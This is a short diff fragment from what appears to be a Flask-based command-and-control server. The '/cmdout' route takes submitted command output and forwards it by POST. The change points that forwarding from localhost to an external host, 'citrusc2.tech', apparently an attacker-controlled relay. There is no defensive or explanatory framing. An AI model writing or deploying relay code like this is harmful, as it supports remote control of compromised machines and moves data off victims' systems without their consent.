@@ -23,7 +23,7 @@ def hello_world():
 @app.route('/cmdout', methods=['POST']) 
 def cmdoutput():
     output = list(request.form.keys())[0]
-    r = requests.post('http://localhost/out', data={'output': output})
+    r = requests.post('http://citrusc2.tech/out', data={'output': output})
     return output
 
 
